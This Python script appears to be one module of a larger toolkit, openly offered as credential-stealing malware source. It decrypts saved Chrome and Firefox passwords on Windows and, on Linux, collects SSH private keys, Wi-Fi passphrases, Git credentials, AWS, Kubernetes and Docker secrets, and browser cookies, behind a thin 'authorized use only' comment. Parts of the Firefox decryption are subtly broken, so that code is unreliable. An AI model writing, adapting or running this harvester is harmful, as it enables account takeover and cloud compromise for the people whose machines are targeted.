#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
模块 07: 数据采集层 —— 跨平台凭据 / 密钥 / 令牌采集

第一性原理实现:
    - Windows: 调用 DPAPI (CryptUnprotectData) 解密 Chrome 密码; NSS (PK11SDR_Decrypt) 解密 Firefox
    - Linux:   读取 SSH 私钥 / NetworkManager 连接配置 / Git 凭据 / 云 CLI 配置 / Chrome Cookies
    - 通用:    SQLite 解析 + 手工 AES-GCM / 3DES 解密

依赖: 标准库 + ctypes (Windows DLL / Linux .so 动态调用)
注意: 仅在本机当前用户凭据的合法授权范围内使用。
"""

import os
import sys
import struct
import sqlite3
import base64
import json
import glob
import re
import configparser
import platform


# ============================ Windows ============================ #
class WindowsHarvester:
    """Windows 浏览器凭据采集。"""

    def __init__(self):
        self.results = []

    def _dpapi_decrypt(self, data: bytes) -> bytes:
        """调用 crypt32!CryptUnprotectData。"""
        if platform.system() != 'Windows':
            return None
        try:
            import ctypes
            from ctypes import wintypes
            crypt32 = ctypes.windll.crypt32

            class DATA_BLOB(ctypes.Structure):
                _fields_ = [('cbData', wintypes.DWORD),
                            ('pbData', ctypes.POINTER(ctypes.c_char))]

            in_blob = DATA_BLOB(cbData=len(data),
                                pbData=ctypes.cast(data, ctypes.POINTER(ctypes.c_char)))
            out_blob = DATA_BLOB()
            if crypt32.CryptUnprotectData(ctypes.byref(in_blob), None, None,
                                          None, None, 0, ctypes.byref(out_blob)):
                plain = ctypes.string_at(out_blob.pbData, out_blob.cbData)
                ctypes.windll.kernel32.LocalFree(out_blob.pbData)
                return plain
        except Exception as e:
            print("[-] DPAPI error:", e)
        return None

    def harvest_chrome(self) -> list:
        local_app = os.environ.get('LOCALAPPDATA')
        if not local_app:
            return []
        base = os.path.join(local_app, 'Google', 'Chrome', 'User Data')
        if not os.path.exists(base):
            return []

        # 读取 Local State 中的加密主密钥
        with open(os.path.join(base, 'Local State'), encoding='utf-8') as f:
            ls = json.load(f)
        enc_key = base64.b64decode(ls['os_crypt']['encrypted_key'])[5:]
        master_key = self._dpapi_decrypt(enc_key)

        for profile in ['Default'] + [d for d in os.listdir(base) if d.startswith('Profile')]:
            db = os.path.join(base, profile, 'Login Data')
            if not os.path.exists(db):
                continue
            tmp = os.path.join(os.environ['TEMP'], f'c_{profile}.db')
            try:
                import shutil
                shutil.copy2(db, tmp)
                cur = sqlite3.connect(tmp).cursor()
                for url, user, enc_pwd in cur.execute(
                        "SELECT origin_url, username_value, password_value FROM logins"):
                    if enc_pwd.startswith(b'v10'):
                        pwd = self._decrypt_aes_gcm(master_key, enc_pwd[3:])
                    elif enc_pwd.startswith(b'v11'):
                        pwd = self._decrypt_aes_gcm(master_key, enc_pwd[3:])
                    else:
                        pwd = self._dpapi_decrypt(enc_pwd)
                    if pwd:
                        self.results.append({'browser': 'Chrome', 'profile': profile,
                                             'url': url, 'username': user,
                                             'password': pwd.decode('utf-8', 'ignore')})
                cur.close()
            except Exception as e:
                print(f"[-] Chrome {profile} error:", e)
            finally:
                if os.path.exists(tmp):
                    os.remove(tmp)
        return self.results

    @staticmethod
    def _decrypt_aes_gcm(key: bytes, data: bytes) -> bytes:
        try:
            from Crypto.Cipher import AES
            nonce, ct, tag = data[:12], data[12:-16], data[-16:]
            return AES.new(key, AES.MODE_GCM, nonce).decrypt_and_verify(ct, tag)
        except Exception:
            return None

    def harvest_firefox(self) -> list:
        app_data = os.environ.get('APPDATA')
        if not app_data:
            return []
        base = os.path.join(app_data, 'Mozilla', 'Firefox', 'Profiles')
        if not os.path.exists(base):
            return []
        for prof in os.listdir(base):
            lp = os.path.join(base, prof)
            for db in ['key4.db', 'key3.db']:
                if os.path.exists(os.path.join(lp, db)):
                    break
            else:
                continue
            logins = os.path.join(lp, 'logins.json')
            if not os.path.exists(logins):
                continue
            with open(logins, encoding='utf-8') as f:
                for item in json.load(f).get('logins', []):
                    pwd = self._firefox_decrypt(item.get('encryptedPassword', ''))
                    if pwd:
                        self.results.append({'browser': 'Firefox', 'profile': prof,
                                             'url': item.get('hostname', ''),
                                             'username': item.get('usernameField', ''),
                                             'password': pwd})
        return self.results

    def _firefox_decrypt(self, enc: str) -> str:
        try:
            import ctypes
            nss_path = self._find_nss()
            if not nss_path:
                return None
            nss = ctypes.CDLL(nss_path)
            nss.NSS_Init.argtypes = [ctypes.c_char_p]
            if nss.NSS_Init(os.path.dirname(nss_path).encode()) != 0:
                return None

            class SECItem(ctypes.Structure):
                _fields_ = [('type', ctypes.c_uint),
                            ('data', ctypes.POINTER(ctypes.c_ubyte)),
                            ('len', ctypes.c_uint)]

            inp = SECItem(0, (ctypes.c_ubyte * len(enc))(), len(enc))
            out = SECItem(0, None, 0)
            nss.PK11SDR_Decrypt(ctypes.byref(inp), ctypes.byref(out), None)
            return ctypes.string_at(out.data, out.len).decode('utf-8', 'ignore')
        except Exception as e:
            print("[-] Firefox decrypt error:", e)
            return None

    @staticmethod
    def _find_nss() -> str:
        for p in [r"C:\Program Files\Mozilla Firefox\nss3.dll",
                  r"C:\Program Files (x86)\Mozilla Firefox\nss3.dll"]:
            if os.path.exists(p):
                return p
        return None


# ============================ Linux ============================ #
class LinuxHarvester:
    """Linux 凭据 / 密钥 / 令牌采集。"""

    def __init__(self):
        self.results = []

    def ssh_keys(self) -> list:
        base = os.path.expanduser('~/.ssh')
        if not os.path.isdir(base):
            return []
        for fn in os.listdir(base):
            if fn.startswith(('id_rsa', 'id_ecdsa', 'id_ed25519', 'id_dsa',
                              'known_hosts', 'config')):
                with open(os.path.join(base, fn), encoding='utf-8', errors='ignore') as f:
                    self.results.append({'type': 'SSH', 'name': fn, 'content': f.read()})
        return self.results

    def wifi(self) -> list:
        base = '/etc/NetworkManager/system-connections'
        if not os.path.isdir(base):
            return []
        for fn in os.listdir(base):
            if not fn.endswith('.nmconnection'):
                continue
            cp = configparser.ConfigParser()
            cp.read(os.path.join(base, fn))
            if 'wifi-security' in cp and 'psk' in cp['wifi-security']:
                self.results.append({'type': 'WiFi', 'ssid': cp.get('connection', 'id', fallback=''),
                                     'password': cp.get('wifi-security', 'psk')})
        return self.results

    def git_credentials(self) -> list:
        for p in [os.path.expanduser('~/.git-credentials'),
                  os.path.expanduser('~/.config/git/credentials')]:
            if os.path.exists(p):
                with open(p, encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        m = re.search(r'://([^:]+):([^@]+)@(.+)', line.strip())
                        if m:
                            self.results.append({'type': 'Git', 'username': m.group(1),
                                                 'password': m.group(2), 'host': m.group(3)})
        return self.results

    def cloud(self) -> list:
        targets = {
            'AWS': os.path.expanduser('~/.aws/credentials'),
            'Kubernetes': os.path.expanduser('~/.kube/config'),
            'Docker': os.path.expanduser('~/.docker/config.json'),
        }
        for name, p in targets.items():
            if os.path.exists(p):
                with open(p, encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                self.results.append({'type': name, 'path': p, 'content': content})
                if name == 'AWS':
                    cp = configparser.ConfigParser()
                    cp.read(p)
                    for sec in cp.sections():
                        if cp.has_option(sec, 'aws_access_key_id'):
                            self.results.append({
                                'type': 'AWS Key', 'profile': sec,
                                'access_key_id': cp.get(sec, 'aws_access_key_id'),
                                'secret_access_key': cp.get(sec, 'aws_secret_access_key', fallback='N/A')})
        return self.results

    def chrome_cookies(self) -> list:
        for base in [os.path.expanduser('~/.config/google-chrome'),
                     os.path.expanduser('~/.config/chromium')]:
            if not os.path.isdir(base):
                continue
            for prof in ['Default'] + [d for d in os.listdir(base) if d.startswith('Profile')]:
                db = os.path.join(base, prof, 'Network', 'Cookies')
                if not os.path.exists(db):
                    continue
                tmp = '/tmp/.cookies.db'
                try:
                    import shutil
                    shutil.copy2(db, tmp)
                    cur = sqlite3.connect(tmp).cursor()
                    for host, name, val, enc, path, exp in cur.execute(
                            "SELECT host_key,name,value,encrypted_value,path,expires_utc FROM cookies"):
                        self.results.append({'type': 'Cookie', 'host': host, 'name': name,
                                             'path': path, 'expires': exp,
                                             'value': val or enc.hex()})
                    cur.close()
                except Exception as e:
                    print("[-] cookie error:", e)
                finally:
                    if os.path.exists(tmp):
                        os.remove(tmp)
        return self.results


if __name__ == "__main__":
    if platform.system() == 'Windows':
        w = WindowsHarvester()
        print("Chrome:", len(w.harvest_chrome()), "Firefox:", len(w.harvest_firefox()))
    else:
        l = LinuxHarvester()
        print("SSH:", len(l.ssh_keys()), "WiFi:", len(l.wifi()),
              "Git:", len(l.git_credentials()), "Cloud:", len(l.cloud()))
